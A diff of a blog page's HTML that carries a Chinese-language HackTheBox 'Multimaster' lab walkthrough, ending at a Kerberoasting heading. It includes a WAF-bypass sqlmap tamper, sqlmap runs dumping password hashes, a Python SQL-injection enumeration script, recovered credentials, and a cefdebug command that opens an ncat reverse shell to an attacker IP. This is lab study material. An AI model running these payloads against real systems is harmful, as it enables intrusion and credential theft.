@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;232  10.10.10.179  端口扫描windows服务器，开了域相关端口，但enum4linux没什么有用信息">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;232  10.10.10.179  端口扫描windows服务器，开了域相关端口，但enum4linux没什么有用信息  80 有一个搜索接口，发送空可以得到所有员工信息：   WAF bypass尝试sql注入，存在WAF，注意unicode编码后可以bypass：   sqlmap存在c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Multimaster - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/05/06/Multimaster-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;232  10.10.10.179  端口扫描windows服务器，开了域相关端口，但enum4linux没什么有用信息">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;232  10.10.10.179  端口扫描windows服务器，开了域相关端口，但enum4linux没什么有用信息  80 有一个搜索接口，发送空可以得到所有员工信息：   WAF bypass尝试sql注入，存在WAF，注意unicode编码后可以bypass：   sqlmap存在c">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050401.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050502.jpg">
@@ -131,8 +131,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -154,7 +161,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -223,67 +230,18 @@
 <li><h2 id="10-10-10-179"><a href="#10-10-10-179" class="headerlink" title="10.10.10.179"></a>10.10.10.179</h2></li>
 </ul>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>windows服务器，开了域相关端口，但enum4linux没什么有用信息</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050401.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050401.jpg" alt=""></p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050501.jpg" alt=""></p>
 <p>有一个搜索接口，发送空可以得到所有员工信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050502.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050503.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050502.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050503.jpg" alt=""></p>
 <h1 id="WAF-bypass"><a href="#WAF-bypass" class="headerlink" title="WAF bypass"></a>WAF bypass</h1><p>尝试sql注入，存在WAF，注意unicode编码后可以bypass：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050504.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050505.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050504.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050505.jpg" alt=""></p>
 <p>sqlmap存在charunicodeencode tamper,简单修改下就可以用于这种情况：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diff charunicodeencode.py /usr/local/Cellar/sqlmap/1.4.4/libexec/tamper/charunicodeencode.py</span><br><span class="line">48c48</span><br><span class="line">&lt;                 retVal += "\\u00%s" % payload[i + 1:i + 3]</span><br><span class="line">---</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">                 retVal += <span class="string">"%%u00%s"</span> % payload[i + 1:i + 3]</span></span><br><span class="line">51c51</span><br><span class="line">&lt;                 retVal += '\\u%.4X' % ord(payload[i])</span><br><span class="line">---</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">                 retVal += <span class="string">'%%u%.4X'</span> % ord(payload[i])</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050506.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050506.jpg" alt=""></p>
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>因为有WAF，需要delay，这部分很耗时间：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3</span><br><span class="line">[INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line"></span><br><span class="line">sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 --dbs</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] Hub_DB</span><br><span class="line">[*] master</span><br><span class="line">[*] model</span><br><span class="line">[*] msdb</span><br><span class="line">[*] tempdb</span><br><span class="line"></span><br><span class="line">sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 -D Hub_DB --tables</span><br><span class="line">Database: Hub_DB</span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| Colleagues |</span><br><span class="line">| Logins     |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 -D Hub_DB -T Logins --dump</span><br><span class="line">Database: Hub_DB</span><br><span class="line">Table: Logins</span><br><span class="line">[17 entries]</span><br><span class="line">+------+----------+--------------------------------------------------------------------------------------------------+</span><br><span class="line">| id   | username | password                                                                                         |</span><br><span class="line">+------+----------+--------------------------------------------------------------------------------------------------+</span><br><span class="line">| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |</span><br><span class="line">| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |</span><br><span class="line">| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |</span><br><span class="line">| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |</span><br><span class="line">| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |</span><br><span class="line">| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |</span><br><span class="line">| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |</span><br><span class="line">| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |</span><br><span class="line">| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |</span><br><span class="line">| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |</span><br><span class="line">| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |</span><br><span class="line">| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |</span><br><span class="line">+------+----------+--------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
 
@@ -303,114 +261,44 @@
 
 <p>转换成unicode，注意选项：</p>
 <p><a href="https://www.branah.com/unicode-converter" target="_blank" rel="noopener">https://www.branah.com/unicode-converter</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050507.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050507.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050601.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0105000000000005150000001C00D1BCD181F1492BDFC23600020000</span><br></pre></td></tr></table></figure>
 
 <h2 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h2><p> 使用上面得到的SID，利用脚本获取数据，注意SID去掉后面几位，因为脚本是拼接遍历：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = bytearray.fromhex(s)</span><br><span class="line">        t.reverse()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(format(x,<span class="string">"02x"</span>) <span class="keyword">for</span> x <span class="keyword">in</span> t).upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> colored(<span class="string">"[i] Finished, Domain Accounts are over"</span>, <span class="string">"blue"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    i = <span class="number">1100</span></span><br><span class="line">    SID = <span class="string">"0x0105000000000005150000001C00D1BCD181F1492BDFC236"</span></span><br><span class="line">    <span class="comment">#SID = raw_input("Enter SID: ")</span></span><br><span class="line">    URL = <span class="string">"http://10.10.10.179/api/getColleagues"</span></span><br><span class="line">    <span class="comment">#URL = raw_input("Enter URL:")</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\n\t+----------------------------------------------------------------------+"</span>, <span class="string">"magenta"</span>)</span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\t|                                                                      |"</span>, <span class="string">"magenta"</span>)</span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\t| Enumerating Script For Domain Accounts by M0NET                      |"</span>, <span class="string">"magenta"</span>)</span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\t| SID: "</span> + SID +  <span class="string">"              |"</span>, <span class="string">"magenta"</span>)</span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\t|                                                                      |"</span>, <span class="string">"magenta"</span>)</span><br><span class="line">    <span class="keyword">print</span> colored(<span class="string">"\t+----------------------------------------------------------------------+\n\n"</span>, <span class="string">"magenta"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1100</span>,<span class="number">6100</span>,<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">            JUNK = <span class="string">"0"</span> + hex((x + i))[<span class="number">2</span>:].upper()</span><br><span class="line">            RID = SID + little(JUNK) + <span class="number">4</span> * <span class="string">"0"</span></span><br><span class="line">            payload = <span class="string">"-' union select 1,2,3,4,SUSER_SNAME(&#123;&#125;)-- -"</span>.format(RID)</span><br><span class="line">            <span class="comment">#payload = raw_input("Enter Payload: ")</span></span><br><span class="line">            pattern = re.compile(<span class="string">r"([0-9a-f]&#123;2&#125;)"</span>)</span><br><span class="line">            encpyload = pattern.sub(<span class="string">r"\\u00\1"</span>, payload.encode(<span class="string">"hex"</span>))</span><br><span class="line">            r = requests.post(URL, data=<span class="string">'&#123;"name": "'</span> + encpyload + <span class="string">'"&#125;'</span>, headers = &#123;<span class="string">"Content-Type"</span>:<span class="string">"application/json;charset=utf-8"</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"403 - Forbidden: Access is denied."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">print</span> colored(<span class="string">"[-] Sleeping until WAF cooldown"</span>, <span class="string">"red"</span>)</span><br><span class="line">                time.sleep(<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"\\"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">print</span> colored(<span class="string">"[i] Counter: "</span> + format((x + i)), <span class="string">"blue"</span>)</span><br><span class="line">                <span class="keyword">print</span> colored(<span class="string">"[+] RID: "</span> + format(RID), <span class="string">"green"</span>)</span><br><span class="line">                <span class="keyword">print</span> colored(<span class="string">"[+] Pyload: "</span> + payload, <span class="string">"green"</span>)</span><br><span class="line">                <span class="comment">#print colored("[+] Encoded payload: " + format(encpayload), "green")</span></span><br><span class="line">                <span class="keyword">print</span> colored(<span class="string">"\n"</span> + r.text, <span class="string">"yellow"</span>)</span><br><span class="line"> </span><br><span class="line">            jsona = json.loads(r.text)</span><br><span class="line">            <span class="keyword">if</span> jsona:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">for</span> element <span class="keyword">in</span> jsona:</span><br><span class="line">                        <span class="keyword">del</span> element[<span class="string">u"position"</span>]</span><br><span class="line">                        <span class="keyword">del</span> element[<span class="string">u"id"</span>]</span><br><span class="line">                        <span class="keyword">del</span> element[<span class="string">u"email"</span>]</span><br><span class="line">                        <span class="keyword">del</span> element[<span class="string">u"name"</span>]</span><br><span class="line">                <span class="keyword">except</span> TypeError:</span><br><span class="line">                    <span class="keyword">del</span> jsona[<span class="string">u"position"</span>]</span><br><span class="line">                    <span class="keyword">del</span> jsona[<span class="string">u"id"</span>]</span><br><span class="line">                    <span class="keyword">del</span> jsona[<span class="string">u"email"</span>]</span><br><span class="line">                    <span class="keyword">del</span> jsona[<span class="string">u"name"</span>]</span><br><span class="line">                data = json.dumps(jsona, sort_keys=<span class="keyword">True</span>, indent=<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"\\"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">print</span> colored(data + <span class="string">"\n"</span>, <span class="string">"yellow"</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="域账号服务列表"><a href="#域账号服务列表" class="headerlink" title="域账号服务列表"></a>域账号服务列表</h2><p>使用上述脚本，得到域账号服务列表：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050602.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Users:</span><br><span class="line">MEGACORP\\james</span><br><span class="line">MEGACORP\\dai</span><br><span class="line">MEGACORP\\tushikikatomo</span><br><span class="line">MEGACORP\\zac</span><br><span class="line">MEGACORP\\lana</span><br><span class="line">MEGACORP\\andrew</span><br><span class="line">MEGACORP\\jorden</span><br><span class="line">MEGACORP\\alyx</span><br><span class="line">MEGACORP\\Privileged IT Accounts</span><br><span class="line">MEGACORP\\cyork</span><br><span class="line">MEGACORP\\rmartin</span><br><span class="line"></span><br><span class="line">Services:</span><br><span class="line">MEGACORP\\DnsAdmins</span><br><span class="line">MEGACORP\\DnsUpdateProxy</span><br><span class="line">MEGACORP\\svc-nas</span><br><span class="line">MEGACORP\\svc-sql</span><br><span class="line">MEGACORP\\ckane</span><br><span class="line">MEGACORP\\kpage</span><br><span class="line">MEGACORP\\ilee</span><br><span class="line">MEGACORP\\nbourne</span><br><span class="line">MEGACORP\\zpowers</span><br></pre></td></tr></table></figure>
 
 <h1 id="smb-login"><a href="#smb-login" class="headerlink" title="smb_login"></a>smb_login</h1><p>使用前面得到的用户名和密码字典枚举smb，得到一组有效账号密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050603.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tushikikatomo : finance1</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用这个账号密码登录，在桌面得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050604.jpg" alt=""></p>
 <h1 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h1><h2 id="特权用户"><a href="#特权用户" class="headerlink" title="特权用户"></a>特权用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all</span><br><span class="line"># 当前用户基本没什么权限</span><br><span class="line">Get-ADUser -Filter * -SearchBase &quot;DC&#x3D;MEGACORP,DC&#x3D;LOCAL&quot;</span><br><span class="line">Get-ADgroup -Filter *</span><br><span class="line"></span><br><span class="line">Get-ADPrincipalGroupMembership jorden | Select-Object Name</span><br><span class="line"></span><br><span class="line">Name</span><br><span class="line">----</span><br><span class="line">Domain Users</span><br><span class="line">Remote Management Users</span><br><span class="line">Server Operators</span><br><span class="line">Developers</span><br></pre></td></tr></table></figure>
 
 <p>注意jorden用户在<strong>Developers</strong>和<strong>Server Operators</strong>组中，这个用户应该具有某些特权</p>
 <h1 id="VSCode-LCE"><a href="#VSCode-LCE" class="headerlink" title="VSCode LCE"></a>VSCode LCE</h1><p>使用<code>Get-Process</code>能够发现很多Code进程，这是<strong>Visual Studio Code</strong></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050605.jpg" alt=""></p>
 <p>VSCode有一个历史漏洞CVE-2019-1414，Local Command Execution</p>
 <h2 id="cefdebug"><a href="#cefdebug" class="headerlink" title="cefdebug"></a>cefdebug</h2><p>我们可以用cefdebug找到调试端口然后执行代码反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cefdebug.exe</span><br><span class="line"></span><br><span class="line">.&#x2F;cefdebug.exe --url ws:&#x2F;&#x2F;127.0.0.1:15836&#x2F;115bfde7-b2cc-49ff-a271-c5b844070216 --code &quot;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cmd.exe &#x2F;c C:&#x2F;temp&#x2F;ncat.exe 10.10.14.109 6666 -e cmd.exe&#39;)&quot;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050606.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050607.jpg" alt=""></p>
 <p>得到的是cyork用户</p>
 <h1 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h1><p>在C:\inetpub\wwwroot\bin&gt;目录有两个文件，MultimasterAPI.dll和MultimasterAPI.pdb，下载这两个文件后能够在其中发现一个密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050608.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MASTER7&#123; &quot;info&quot; : &quot;MegaCorp API&quot; &#125;!application&#x2F;json server&#x3D;localhost;database&#x3D;Hub_DB;uid&#x3D;finder;password&#x3D;D3veL0pM3nT!;</span><br></pre></td></tr></table></figure>
 
 <p>但使用这个密码登录finder失败，密码是由development变形而来，想到需要前面得到的<strong>Developers</strong>用户组中的用户</p>
 <h2 id="Developers"><a href="#Developers" class="headerlink" title="Developers"></a>Developers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADGroupMember -Identity Developers</span><br></pre></td></tr></table></figure>
 
 <p>使用得到的用户尝试，成功登录sbauer, 但这个用户也没什么特权：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050609.jpg" alt=""></p>
 <h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h1><p>注意到这句信息</p>
